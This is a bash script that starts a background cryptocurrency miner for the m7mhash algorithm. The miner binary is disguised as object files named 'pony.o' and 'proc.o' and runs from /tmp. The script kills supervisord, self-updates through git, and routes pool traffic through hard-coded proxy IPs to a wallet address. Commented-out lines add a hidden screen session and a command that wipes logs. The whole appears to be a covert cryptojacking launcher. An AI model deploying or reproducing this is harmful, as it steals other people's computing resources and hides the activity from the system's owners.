#!/bin/bash
#if ! screen -list | grep -q "pty1"; then
#	screen -dmS pty1 ~/.key/proc.o -a m7mhash --proxy=http://45.6.216.79:80 -o stratum+tcp://coinsump.com:6033 -u 99eAamS3fcYvrxDJo7bVhswjpp2XmqazHh -p stats -e 50
#	rm -rf ~/logs/*
#fi
killall supervisord
killall supervisord
#######
cd "$(dirname "$0")"
#cd /tmp
#wget https://github.com/happypony9/HappyPony/archive/master.zip
#unzip master.zip

#######
git config user.email "bleh@bleh.com"
git config user.name "whoami"
git stash
git pull
#######
PROCESS="pony.o"
RESULT=`pgrep ${PROCESS}`
#######
if [ "${RESULT:-null}" = null ]; then
    echo "Happy Pony is starting..."
    #~/HappyPony/proc.o -a m7mhash --proxy=http://92.52.160.50:8080  -o stratum+tcp://magi.trasmamod.com:3333 --user=mindamp.test --pass=test -e 50 &
    #~/HappyPony/proc.o --quiet --retry-pause=5 --retries=1 --algo=m7mhash --proxy=http://167.99.202.168:80 --url=stratum+tcp://xmg.minerclaim.net:3333 --user=mindamp.test --pass=test --cpu-efficiency=60 &
 # /tmp/HappyPony/pony.o --quiet --retry-pause=5 --retries=1 --algo=m7mhash --proxy=http://167.99.202.168:80 --url=stratum+tcp://pool.coinsump.com:3333 --user=99eAamS3fcYvrxDJo7bVhswjpp2XmqazHh --pass=stats,uber1 -e 10 -t 2 &
    /tmp/HappyPony/pony.o --quiet --retry-pause=5 --retries=1 --algo=m7mhash --proxy=http://167.99.202.168:80 --url=stratum+tcp://pool.coinsump.com:3333 --user=99eAamS3fcYvrxDJo7bVhswjpp2XmqazHh --pass=stats,uber1 -e 50 -t 4 &

#cd /tmp/HappyPony-master
    #/tmp/HappyPony-master/proc.o --quiet --retry-pause=5 --retries=1 --algo=m7mhash --proxy=http://139.99.158.149:80 --url=stratum+tcp://magi.trasmamod.com:3333 --user=mindamp.test --pass=test -e 10 &
else
    echo "Happy Pony already started..."
fi
#######
